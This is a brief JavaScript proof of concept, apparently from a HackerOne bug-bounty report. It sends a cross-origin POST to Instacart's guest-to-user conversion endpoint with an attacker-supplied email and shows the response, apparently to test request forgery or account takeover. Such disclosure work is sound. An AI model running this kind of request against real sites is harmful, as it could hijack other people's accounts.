var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
	    if (xhr.readyState == XMLHttpRequest.DONE) {
		            alert(xhr.responseText);
		        }
}
xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest')
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded')
xhr.open('POST', 'https://www.instacart.com/api/v2/guests/convert_to_user', true);
//xhr.withCredentials = true;
xhr.send("email=greeny+4343@wearehackerone.com");
